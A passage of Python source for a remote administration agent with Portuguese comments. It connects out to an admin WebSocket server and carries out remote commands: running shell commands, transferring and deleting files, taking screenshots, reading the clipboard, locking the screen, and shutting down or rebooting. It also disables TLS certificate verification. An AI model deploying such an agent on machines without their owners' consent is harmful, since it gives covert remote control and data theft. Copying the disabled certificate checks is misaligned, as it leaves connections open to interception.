                    meta = json.dumps({"filename": name_or_err, "ok": True}).encode()
                    meta_padded = meta.ljust(256, b"\x00")[:256]
                    self._send(MSG["FILE_DOWNLOAD_RES"], meta_padded + data)

            elif msg_type == MSG["FILE_UPLOAD_REQ"]:
                meta_raw  = payload[:256].rstrip(b"\x00")
                file_data = payload[256:]
                meta = json.loads(meta_raw.decode("utf-8", errors="replace"))
                res = file_upload(meta.get("dest_path", str(Path.home())),
                                  meta.get("filename", "upload"), file_data)
                self._send(MSG["FILE_UPLOAD_RES"], json.dumps(res).encode())

            elif msg_type == MSG["FILE_DELETE_REQ"]:
                d = decode_json(payload)
                self._send(MSG["FILE_DELETE_RES"],
                           json.dumps(file_delete(d.get("path", ""))).encode())

            elif msg_type == MSG["FILE_RENAME_REQ"]:
                d = decode_json(payload)
                self._send(MSG["FILE_RENAME_RES"],
                           json.dumps(file_rename(d.get("old_path", ""), d.get("new_name", ""))).encode())

            elif msg_type == MSG["FILE_MKDIR_REQ"]:
                d = decode_json(payload)
                self._send(MSG["FILE_MKDIR_RES"],
                           json.dumps(file_mkdir(d.get("path", ""), d.get("name", "nova_pasta"))).encode())

            elif msg_type == MSG["FILE_SEARCH_REQ"]:
                d = decode_json(payload)
                self._send(MSG["FILE_SEARCH_RES"],
                           json.dumps(file_search(d.get("base_path", str(Path.home())),
                                                  d.get("query", ""))).encode())

            elif msg_type == MSG["FILE_MOVE_REQ"]:
                d = decode_json(payload)
                self._send(MSG["FILE_MOVE_RES"],
                           json.dumps(file_move(d.get("src", ""), d.get("dst", ""))).encode())

            elif msg_type == MSG["TERM_CMD_REQ"]:
                d = decode_json(payload)
                self._send(MSG["TERM_CMD_RES"],
                           json.dumps(run_command(d.get("cmd", ""))).encode())

            # ── SCREENSHOT — HANDLER CORRIGIDO ─────────────────────────────
            elif msg_type == MSG["SCREEN_REQ"]:
                """
                Fluxo corrigido:
                  1. Parseia quality do payload (default 70)
                  2. Chama build_screen_response() que retorna dict padronizado
                  3. Serializa como JSON e envia com MSG_TYPE=SCREEN_RES
                  4. O admin._handle_screen_res extrai _b64 e decodifica
                """
                try:
                    d = decode_json(payload) if payload else {}
                    quality = int(d.get("quality", 70))
                except Exception:
                    quality = 70

                log.info(f"[SCREEN_REQ] Iniciando captura quality={quality}")
                response = build_screen_response(quality)

                if response["ok"]:
                    log.info(f"[SCREEN_REQ] Captura OK — {response['size']} bytes JPEG "
                             f"(~{len(response['_b64'])} chars b64), backend={response['backend']}")
                else:
                    log.error(f"[SCREEN_REQ] Captura FALHOU: {response.get('msg')}")

                # Envia sempre como JSON — o admin sabe como extrair _b64
                payload_out = json.dumps(response, ensure_ascii=False).encode("utf-8")
                self._send(MSG["SCREEN_RES"], payload_out)

            # ── Lock / Unlock ───────────────────────────────────────────────
            elif msg_type == MSG["LOCK_REQ"]:
                d = decode_json(payload)
                password = decrypt_password(d.get("password", ""))
                message  = d.get("message", "Tela bloqueada pelo administrador.")
                ok = _screen_lock.lock(password, message)
                self._send(MSG["LOCK_RES"],
                           json.dumps({"ok": ok, "msg": "Bloqueado" if ok else "Já bloqueado"}).encode())

            elif msg_type == MSG["UNLOCK_REQ"]:
                ok = _screen_lock.unlock()
                self._send(MSG["UNLOCK_RES"],
                           json.dumps({"ok": ok, "msg": "Desbloqueado"}).encode())

            elif msg_type == MSG["NET_INFO_REQ"]:
                self._send(MSG["NET_INFO_RES"],
                           json.dumps(collect_net_info(), default=str).encode())

            elif msg_type == MSG["NET_PING_REQ"]:
                d = decode_json(payload)
                self._send(MSG["NET_PING_RES"],
                           json.dumps(ping_host(d.get("host", "8.8.8.8"))).encode())

            elif msg_type == MSG["LOG_REQ"]:
                d = decode_json(payload) if payload else {}
                entries = read_logs(d.get("level", "DEBUG"), d.get("limit", 500))
                self._send(MSG["LOG_RES"], json.dumps({"entries": entries}).encode())

            elif msg_type == MSG["ACTION_CLIPBOARD_GET"]:
                self._send(MSG["ACTION_CLIPBOARD_RES"],
                           json.dumps({"content": clipboard_get()}).encode())

            elif msg_type == MSG["ACTION_CLIPBOARD_SET"]:
                d = decode_json(payload)
                ok = clipboard_set(d.get("text", ""))
                self._send(MSG["ACTION_CLIPBOARD_SET_RES"],
                           json.dumps({"ok": ok, "action": "clipboard_set", "msg": ""}).encode())

            elif msg_type == MSG["ACTION_POPUP_MSG"]:
                d = decode_json(payload)
                show_popup(d.get("title", "Mensagem"), d.get("body", ""))
                self._send(MSG["ACTION_POPUP_RES"],
                           json.dumps({"ok": True, "action": "popup", "msg": ""}).encode())

            elif msg_type == MSG["ACTION_OPEN_URL"]:
                d = decode_json(payload)
                open_url(d.get("url", ""))
                self._send(MSG["ACTION_OPEN_URL_RES"],
                           json.dumps({"ok": True, "action": "open_url", "msg": ""}).encode())

            elif msg_type == MSG["ACTION_RESTART_AGENT"]:
                threading.Thread(target=self._restart, daemon=True).start()

            elif msg_type == MSG["ACTION_STOP_AGENT"]:
                threading.Thread(target=lambda: (time.sleep(0.5), os._exit(0)),
                                 daemon=True).start()

            elif msg_type == MSG["ACTION_SHUTDOWN"]:
                self._send(MSG["ACTION_SHUTDOWN_RES"],
                           json.dumps({"ok": True, "action": "shutdown", "msg": ""}).encode())
                cmd = "shutdown /s /t 1" if platform.system() == "Windows" else "shutdown -h now"
                subprocess.Popen(cmd, shell=True)

            elif msg_type == MSG["ACTION_REBOOT"]:
                self._send(MSG["ACTION_REBOOT_RES"],
                           json.dumps({"ok": True, "action": "reboot", "msg": ""}).encode())
                cmd = "shutdown /r /t 1" if platform.system() == "Windows" else "reboot"
                subprocess.Popen(cmd, shell=True)

            else:
                log.debug(f"Comando sem handler: {name}")

        except Exception as e:
            log.error(f"Erro ao processar {name}: {e}", exc_info=True)
            try:
                self._send(MSG["GENERIC_ERROR"],
                           json.dumps({"ok": False, "msg": str(e)}).encode())
            except Exception:
                pass

    def _restart(self):
        time.sleep(0.5)
        os.execv(sys.executable, [sys.executable] + sys.argv)


# ===========================================================================
# Agente principal — WebSocket
# ===========================================================================
class Agent:
    def __init__(self):
        self._running = True
        self._ws = None

    def start(self):
        self._print_banner()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                signal.signal(sig, self._signal_handler)
            except (ValueError, OSError):
                pass

        while self._running:
            try:
                self._connect_and_run()
            except Exception as e:
                log.error(f"Erro na sessão: {e}")
            if self._running:
                log.info(f"Reconectando em {RECONNECT_DELAY}s...")
                time.sleep(RECONNECT_DELAY)

    def _connect_and_run(self):
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode    = ssl.CERT_NONE
        origin = ADMIN_WS_URL.replace("wss://", "https://")

        async def _run():
            async with websockets.connect(
                ADMIN_WS_URL,
                ssl=ssl_ctx,
                additional_headers={
                    "Origin": origin,
                    "Host":   ADMIN_WS_URL.replace("wss://", "").rstrip("/"),
                },
                ping_interval=20,
                ping_timeout=10,
                open_timeout=15,
            ) as ws:
                self._ws = ws
                log.info("Conectado ao admin via WebSocket!")

                # Autenticação
                hello = {"token": AUTH_TOKEN, "sys_info": collect_sys_info()}
                await ws.send(json.dumps({"type": MSG["AUTH_HELLO"], "payload": hello}))

                # Cria send_fn thread-safe para o Dispatcher
                loop = asyncio.get_event_loop()
                send_lock = asyncio.Lock()

                def send_fn(msg_type: int, payload: bytes = b""):
                    """
                    Envia resposta ao admin via WebSocket.
                    
                    Payload JSON → envia como JSON diretamente.
                    Payload binário (ex: file download) → serializa _b64 no JSON.
                    """
                    async def _send_async():
                        async with send_lock:
                            try:
                                # Tenta parse como JSON
                                payload_obj = json.loads(payload.decode("utf-8")) if payload else {}
                                is_binary   = False
                            except (json.JSONDecodeError, UnicodeDecodeError):
                                # Payload binário puro → base64
                                payload_obj = {"_b64": base64.b64encode(payload).decode("ascii")}
                                is_binary   = True

                            msg_out = json.dumps({
                                "type":    msg_type,
                                "payload": payload_obj,
                                "binary":  is_binary,
                            })
                            await ws.send(msg_out)

                    # Agenda no event loop do asyncio (thread-safe)
                    asyncio.run_coroutine_threadsafe(_send_async(), loop)

                dispatcher = Dispatcher(send_fn)

                async for raw in ws:
                    try:
                        if isinstance(raw, bytes):
                            raw = raw.decode("utf-8")
                        msg = json.loads(raw)
                        msg_type     = msg.get("type")
                        payload_data = msg.get("payload", {})
                        is_binary    = msg.get("binary", False)

                        # Reconstrói payload bytes
                        if is_binary and isinstance(payload_data, dict) and "_b64" in payload_data:
                            payload = base64.b64decode(payload_data["_b64"])
                        elif payload_data:
                            payload = json.dumps(payload_data).encode("utf-8")
                        else:
                            payload = b""

                        # Executa handler em thread separada para não bloquear o loop
                        threading.Thread(
                            target=dispatcher.handle,
                            args=(msg_type, payload),
                            daemon=True
                        ).start()

                    except Exception as e:
                        log.error(f"Erro ao processar mensagem WS: {e}", exc_info=True)

        asyncio.run(_run())

    def _signal_handler(self, sig, frame):
        print("\n[Agent] Encerrando...")
        self._running = False
        sys.exit(0)

    def _print_banner(self):
        print("""
╔══════════════════════════════════════════════════════════════╗
║           AURA CORE — AGENT v2 (screenshot corrigido)        ║
║                                                              ║
║  Backends de screenshot detectados:                         ║""")
        print(f"║    mss:        {'✓ disponível' if HAS_MSS else '✗ ausente (pip install mss)':40s}║")
        print(f"║    PIL.Grab:   {'✓ disponível' if HAS_PIL_GRAB else '✗ ausente (pip install Pillow)':40s}║")
        print(f"║    pyautogui:  {'✓ disponível' if HAS_PYAUTOGUI_SS else '✗ ausente (pip install pyautogui)':40s}║")
        print("""║                                                              ║
║  Pressione Ctrl+C para encerrar.                            ║
╚══════════════════════════════════════════════════════════════╝
""")
        log.info(f"Admin WS: {ADMIN_WS_URL}")
        log.info(f"Screenshot backends: mss={HAS_MSS}, pil={HAS_PIL_GRAB}, pyautogui={HAS_PYAUTOGUI_SS}")


def main():
    agent = Agent()
    try:
        agent.start()
    except KeyboardInterrupt:
        print("\n[Agent] Encerrado pelo usuário.")


if __name__ == "__main__":
    main()
